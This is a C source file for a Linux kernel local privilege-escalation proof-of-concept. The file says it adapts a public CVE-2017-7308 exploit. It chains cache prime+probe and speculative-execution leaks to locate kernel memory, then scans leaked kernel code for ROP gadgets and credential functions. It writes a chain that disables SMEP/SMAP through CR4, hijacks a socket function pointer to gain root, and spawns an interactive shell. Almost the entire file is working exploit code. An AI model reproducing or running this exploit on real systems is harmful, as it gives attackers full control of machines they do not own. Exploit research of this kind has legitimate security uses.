#define _GNU_SOURCE

#include "envprep.h"
#include "memprep.h"
#include "memwrite.h"
#include "specex_utils.h"
#include "specex_leaks.h"
#include "llc_prime_probe.h"
#include "config.h"

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/mman.h>

#define USER_PAGE_SIZE (2ul*1024*1024) // 2MB

struct timespec total_exec_start;
void start_timer_total_exec() {
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
}

void stop_timer_total_exec() {
  struct timespec total_exec_finish;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);

  double total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  char mod[] = "\033[1;4;93m"; // bold;underline;high-intensity-yellow
  char nomod[] = "\033[00m";
  printf("\n%s[#] Total execution time of PoC: %.3f sec%s\n", mod, total_exec_elapsed, nomod);
}

// CHECK IF ROOT and POP SHELL!
void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

int check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return 0;
	}

	printf("[+] got r00t ^_^\n");

	return 1;
}

unsigned long find_byte_seq(char* code_bytes, unsigned long code_size, char* seek_bytes, unsigned long seek_bytes_size) {
  unsigned long i, b;

  for (i = 0; i < code_size; i++) {
    int found = 1;
    for (b = 0; b < seek_bytes_size; b++) {
      if (code_bytes[i+b] != seek_bytes[b]) {
        found = 0;
        break;
      }
    }
    if (found) {
      return i;
    }
  }

  printf("failed to find byte seq.. exiting..\n");
  exit(1);

  return 0x0ul;
}

unsigned long find_function_start(unsigned long start_idx, char* code_bytes, unsigned long code_size) {
  //1: 0xffffffff966a5dc0-0xffffffff966a5dc5: nop dword ptr [rax + rax]     5:0F 1F 44 00 00
  //2: 0xffffffff966a5dc5-0xffffffff966a5dc6: push  rbp                     1:55
  char signature[6] = {0x0F, 0x1F, 0x44, 0x00, 0x00, 0x55};

  unsigned long curr_idx = start_idx - (start_idx%16);

  while (curr_idx > 0) {
    int found = 1;

    unsigned long b;
    for (b = 0; b < sizeof(signature); b++) {
      if (code_bytes[curr_idx+b] != signature[b]) {
        found = 0;
        break;
      }
    }
    if (found) {
      return curr_idx;
    }

    curr_idx -= 16;
  }

  printf("failed to find function start.. exiting..\n");
  exit(1);

  return 0x0;
}

unsigned long find_function_commit_creds(unsigned long kernel_base, char* code_bytes, unsigned long code_size) {
  // two functions load this specific global var.
  // commit_creds loads it one time and setup_new_exec two times.
  // assumes we know access in data section.
  // .text:FFFFFFFF810A5E83                 mov     esi, cs:dword_FFFFFFFF821EDE60

  unsigned long koffset_global_var = 0x11ede60ul;
  unsigned long kaddr_global_var = kernel_base + koffset_global_var;

  unsigned long koffset_func_starts[3] = {0x0ul, 0x0ul, 0x0ul};
  int found_funcs = 0;

  char mov_from_data_seg_bytes[6] = {0x8B, 0x35, 0x00, 0x00, 0x00, 0x00};

  unsigned long i, b;
  unsigned long next_search_idx_start = 0x0;
  while (found_funcs < sizeof(koffset_func_starts)/sizeof(unsigned long)) {
    unsigned long found_ins_offset = 0xfffffffffffffffful;

    for (i = next_search_idx_start; i < code_size; i++) {
      unsigned long next_ins_addr = kernel_base + i + sizeof(mov_from_data_seg_bytes);
      *(unsigned int*) &mov_from_data_seg_bytes[2] = (unsigned int) (kaddr_global_var - next_ins_addr);

      int found = 1;
      for (b = 0; b < sizeof(mov_from_data_seg_bytes); b++) {
        if (code_bytes[i+b] != mov_from_data_seg_bytes[b]) {
          found = 0;
          break;
        }
      }
      if (found) {
        found_ins_offset = i;
        break;
      }
    }

    if (found_ins_offset == 0xfffffffffffffffful) {
      printf("[.]  >> failed to find byte seq.. exiting..\n");
      exit(1);
    }

    koffset_func_starts[found_funcs] = find_function_start(found_ins_offset, code_bytes, code_size);
    found_funcs += 1;

    next_search_idx_start = found_ins_offset + sizeof(mov_from_data_seg_bytes);
  }

  // commit_creds uses the global var 1 time and the other function 2 times.
  // So check for the function that appeared once.
  for (i = 0; i < found_funcs; i++) {
    unsigned long test_func = koffset_func_starts[i];

    int f;
    int c = 0;
    for (f = 0; f < found_funcs; f++) {
      if (test_func == koffset_func_starts[f]) {
        c += 1;
      }
    }

    if (c == 1) {
      return kernel_base + test_func;
    }
  }

  printf("[.]  >> failed to find commit_creds.. exiting..\n");
  exit(1);

  return 0x0ul;
}

unsigned long find_function_prepare_kernel_cred(unsigned long kernel_base, char* code_bytes, unsigned long code_size) {
  // only appears in prepare_kernel_cred.
  // assumes we know access in data section.
  // .text:FFFFFFFF810A61EF                 lock inc cs:dword_FFFFFFFF81E4A2E0
  char lock_ins_bytes[7] = {0xF0, 0xFF, 0x05, 0x00, 0x00, 0x00, 0x00};

  unsigned long koffset_global_var = 0xe4a2e0ul;
  unsigned long kaddr_global_var = kernel_base + koffset_global_var;

  unsigned long koffset_lock_inc = 0xfffffffffffffffful;
  unsigned long i, b;
  for (i = 0; i < code_size; i++) {
    unsigned long next_ins_addr = kernel_base + i + sizeof(lock_ins_bytes);
    *(unsigned int*) &lock_ins_bytes[3] = (unsigned int) (kaddr_global_var - next_ins_addr);

    int found = 1;
    for (b = 0; b < sizeof(lock_ins_bytes); b++) {
      if (code_bytes[i+b] != lock_ins_bytes[b]) {
        found = 0;
        break;
      }
    }
    if (found) {
      koffset_lock_inc = i;
      break;
    }
  }

  if (koffset_lock_inc == 0xfffffffffffffffful) {
    printf("failed to find byte seq.. exiting..\n");
    exit(1);
  }

  unsigned long koffset_func_start = find_function_start(koffset_lock_inc, code_bytes, code_size);

  return kernel_base + koffset_func_start;
}

unsigned long stack_pivot=0x0;
unsigned long pop_rsp=0x0;
unsigned long pop_rdx=0x0;
unsigned long mov_rax_cr4=0x0;
unsigned long and_rax_rdx=0x0;
unsigned long save_rax=0x0;
unsigned long pop_rdi=0x0;
unsigned long mov_cr4_rdi=0x0;
int (*commit_creds)(void*) = NULL;
void* (*prepare_kernel_cred)(void*) = NULL;

void find_gadgets_and_functions(unsigned long kernel_base, char* code_bytes, unsigned long code_size) {
  struct timespec start_time;
  struct timespec end_time;

  printf("\n[.] searching for gadgets and the functions commit_creds and prepare_kernel_cred..\n");

  clock_gettime(CLOCK_MONOTONIC, &start_time);

  char bytes_stack_pivot[7] = {0x53, 0x08, 0x5B, 0x41, 0x5C, 0x5D, 0xC3};
  stack_pivot = kernel_base + find_byte_seq(code_bytes, code_size, bytes_stack_pivot, sizeof(bytes_stack_pivot));
  printf("[.]  >> found gadget: stack pivot @ 0x%lx\n", stack_pivot);
  char bytes_pop_rsp[3] = {0x5C, 0x5D, 0xC3};
  pop_rsp = kernel_base + find_byte_seq(code_bytes, code_size, bytes_pop_rsp, sizeof(bytes_pop_rsp));
  printf("[.]  >> found gadget: pop rsp @ 0x%lx\n", pop_rsp);
  char bytes_pop_rdx[2] = {0x5A, 0xC3};
  pop_rdx = kernel_base + find_byte_seq(code_bytes, code_size, bytes_pop_rdx, sizeof(bytes_pop_rdx));
  printf("[.]  >> found gadget: pop rdx @ 0x%lx\n", pop_rdx);
  char bytes_mov_rax_cr4[5] = {0x0F, 0x20, 0xE0, 0x5D ,0xC3};
  mov_rax_cr4 = kernel_base + find_byte_seq(code_bytes, code_size, bytes_mov_rax_cr4, sizeof(bytes_mov_rax_cr4));
  printf("[.]  >> found gadget: mov rax cr4 @ 0x%lx\n", mov_rax_cr4);
  char bytes_and_rax_rdx[4] = {0x48, 0x21, 0xD0, 0xC3};
  and_rax_rdx = kernel_base + find_byte_seq(code_bytes, code_size, bytes_and_rax_rdx, sizeof(bytes_and_rax_rdx));
  printf("[.]  >> found gadget: and rax rdx @ 0x%lx\n", and_rax_rdx);
  char bytes_save_rax[4] = {0x48, 0x89, 0x02, 0xC3};
  save_rax = kernel_base + find_byte_seq(code_bytes, code_size, bytes_save_rax, sizeof(bytes_save_rax));
  printf("[.]  >> found gadget: save rax on stack @ 0x%lx\n", save_rax);
  char bytes_pop_rdi[2] = {0x5F, 0xC3};
  pop_rdi = kernel_base + find_byte_seq(code_bytes, code_size, bytes_pop_rdi, sizeof(bytes_pop_rdi));
  printf("[.]  >> found gadget: pop rdi @ 0x%lx\n", pop_rdi);
  char bytes_mov_cr4_rdi[5] = {0x0F, 0x22, 0xE7, 0x5D ,0xC3};
  mov_cr4_rdi = kernel_base + find_byte_seq(code_bytes, code_size, bytes_mov_cr4_rdi, sizeof(bytes_mov_cr4_rdi));
  printf("[.]  >> found gadget: mov cr4 rdi @ 0x%lx\n", mov_cr4_rdi);

  commit_creds = (int (*)(void*)) find_function_commit_creds(kernel_base, code_bytes, code_size);
  printf("[.]  >> found function: commit_creds @ 0x%lx\n", (unsigned long) commit_creds);
  prepare_kernel_cred = (void* (*)(void*)) find_function_prepare_kernel_cred(kernel_base, code_bytes, code_size);
  printf("[.]  >> found function: prepare_kernel_cred @ 0x%lx\n", (unsigned long) prepare_kernel_cred);

  clock_gettime(CLOCK_MONOTONIC, &end_time);

  double elapsed_time = (end_time.tv_sec - start_time.tv_sec);
  elapsed_time += (end_time.tv_nsec - start_time.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished finding gadgets and functions in %.3f sec\n", elapsed_time);

  printf("[.] searching for gadgets and the functions commit_creds and prepare_kernel_cred.. DONE\n");
}

int priv_elevated = 0;
__attribute__((used, noinline))
void elevate_priv() {
  commit_creds(prepare_kernel_cred(NULL));
  priv_elevated = 1;
}

__attribute__((used, noinline))
void userspace_wrapper() {
  asm volatile (
    " mov %%gs:0x16a04, %%rax\n"
    " sub $0x3e8, %%rax\n"
    " mov %%rax, %%rsp\n"
    " call elevate_priv\n"
    " ret\n"
  : /* no output */
  : /* no input */
  : "rax", "rsp");
}

__attribute__((noinline))
void write_payload(unsigned long user_page, unsigned long user_page_physmap_addr) {
  char buffer[256];
  int size;

  // Disable speculative exuection by restoring the flags in specex socket.
  // Flags:
  // - SOCK_ZAPPED            0x0100 <- originally the only one set
  // - SOCK_USE_WRITE_QUEUE   0x0200 <- unset (enables spec.exec. when set)
  // - SOCK_DBG               0x0400 <- unset
  set_arb_mem_writer_pos(0x800 + SKC_FLAGS_OFFSET - 40); // change offset in fptr_writer socket
  write_skc_flags(0x0100);

  printf("\n[.] restored conditional branch flag of speculative execution socket object to exploit it for 'real' control-flow hijacking\n");
  fflush(stdout);
  usleep(50000);

  unsigned long core_rop_chain_base = user_page_physmap_addr + 0x600; // core rop chain base at 0xe00 in page (0x800 (socket obj offset) + 0x600);

  // stack pivoting
  // 1: write stack pivot address
  write_fptr(specex_socket_second, stack_pivot, 8); // push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
  printf("\n[.] overwrote the function pointer with the stack pivoting gadget\n");
  fflush(stdout);
  usleep(50000);

  // 2: make rsp point to core rop chain
  set_arb_mem_writer_pos(0x800); // make writer point to base of socket where few gadget data will be written
  memset(buffer, 0, sizeof(buffer));
  size = 0;
  *(unsigned long*) (buffer +  0x8) = 0x0; // => popped into RBP #note that least significant 2 bytes are not written. see oob_write below.
  size += 8;
  *(unsigned long*) (buffer +  0x8) = pop_rsp; // pop rsp ; pop rbp ; ret
  size += 8;
  *(unsigned long*) (buffer + 0x10) = core_rop_chain_base; // => popped into RSP
  size += 8;
  print_status_blocks(arb_mem_writer->iov);
  oob_write(buffer+2, size-2);
  usleep(50000);

  // write core rop chain
  // 1: prepare chain
  //set_arb_mem_writer_pos(0x800 + 0x600); // make writer point to rop chain location
  memset(buffer, 0, sizeof(buffer));
  size = 0;
  // 1.1: finish GADGET_POP_RSP
  *(unsigned long*) (buffer + size) = 0x0; // => popped into RBP
  size += 8;
  // 1.2: load CR4 into RAX
  *(unsigned long*) (buffer + size) = mov_rax_cr4; // mov rax, cr4 ; pop rbp ; ret
  size += 8 + 8;
  // 1.3: unset SMAP/SMEP registers in RAX
  *(unsigned long*) (buffer + size) = pop_rdx; // pop rdx ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = 0xffffffffffcfffff; // => popped into RDX #mask with SMAP and SMEP bits (21,20) unset
  size += 8;
  *(unsigned long*) (buffer + size) = and_rax_rdx; // and rax, rdx ; ret
  size += 8;
  // 1.4: move RAX to RDI
  *(unsigned long*) (buffer + size) = pop_rdx; // pop rdx ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = core_rop_chain_base + size + 0x18; // => popped into RDX #pointing to the placeholder for updated CR4, see below
  size += 8;
  *(unsigned long*) (buffer + size) = save_rax; // mov qword ptr [rdx], rax ; ret
  size += 8;
  // 1.5: move RDI to CR4
  *(unsigned long*) (buffer + size) = pop_rdi; // pop rdi ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = 0xdeadbeefdeadbeef; // => popped into RDI #placeholder for the updated CR4 value
  size += 8;
  *(unsigned long*) (buffer + size) = mov_cr4_rdi; // mov cr4, rdi ; pop rbp ; ret
  size += 8 + 8;
  // 1.6: change control flow to user space
  *(unsigned long*) (buffer + size) = (unsigned long) &userspace_wrapper;
  size += 8;

  memcpy((void*)(user_page+0x600), buffer, size);

  printf("[.] crafted and wrote the ROP chain in user page at physmap addr 0x%lx.\n", (unsigned long) (user_page_physmap_addr));
  fflush(stdout);
  usleep(50000);
}

void execute_payload() {
  char buffer[16];
  int size = sizeof(buffer);
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_ifindex = if_nametoindex("lo");
  sa.sll_halen = ETH_ALEN;

  printf("[.] triggering ROP chain..\n");
  fflush(stdout);
  sleep(2);

  sendto(specex_socket_second, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa));

  printf("[.] triggering ROP chain.. DONE\n");
}

void init_matrices();
int main(int argc, char **argv) {
	srand(time(NULL));

  printf("[#] This PoC exploit is a modified version of\n");
  printf("[#]  https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c\n");
  printf("[#] So you might recognize overlapping lines.\n");

	printf("\n[.] starting\n");
	start_timer_total_exec();

	setup_sandbox();

  set_cpu(MAIN_THREAD_CPU_ID);

  init_matrices();

  printf("\n[.] find LLC eviction sets..\n");
  printf("[.] using eviction set generation method: %s\n", PP_EVICSET_GEN_METHOD);
  pp_create_eviction_sets(PP_EVICSET_GEN_METHOD, LLC_SIZE_IN_MB, LLC_ASSOCIATIVITY);
  printf("[.] find LLC eviction sets.. DONE\n");

  prepare_memory_layout();
  find_necessary_items();
  free_unneeded_objects();

  init_specex_leaks();

  start_flag_eviction_in_co_thread();

  unsigned long kernel_base_address = find_kernel_image();

  unsigned long spectre_gadget_addr = find_spectre_gadget(kernel_base_address);

  unsigned long heap_base_address = find_heap_base_spectre(spectre_gadget_addr);

  unsigned long user_page = (unsigned long) mmap(NULL, USER_PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (user_page == (unsigned long) MAP_FAILED) {
    perror("mmap");
    exit(1);
  }
  memset((char*)user_page, 0x3c, USER_PAGE_SIZE);

  unsigned long physmap_addr = find_user_page_in_physmap(user_page, USER_PAGE_SIZE, heap_base_address, spectre_gadget_addr, kernel_base_address);

  spectre_gadget_addr = find_spectre_gadget_start(spectre_gadget_addr, kernel_base_address, 0x8a55b8ul, user_page, physmap_addr);
  leak_kernel_code(spectre_gadget_addr, kernel_base_address, 0x8a55b8ul, user_page, physmap_addr);

  char *kernel_code_bytes = NULL;
  unsigned long code_size = 0;
  get_kernel_code_bytes(&kernel_code_bytes, &code_size);

  find_gadgets_and_functions(kernel_base_address, kernel_code_bytes, code_size);
  write_payload(user_page, physmap_addr); // write payload in user page
  execute_payload(); // trigger payload with the specex socket

  int got_root = check_root();
  stop_timer_total_exec();

  if (got_root) {
    // Fork and exec instead of just doing the exec to avoid potential
    // memory corruptions when closing packet sockets.
    fork_shell();
  }

  munmap((void*)user_page, USER_PAGE_SIZE);

  close_specex_leaks();

  // stop flag evicting thread
  stop_co_thread();

  pp_close();

  // make poc process sleep infinitely
  fflush(stdout);
  fflush(stderr);
	while (1) sleep(1000);

	return 0;
}
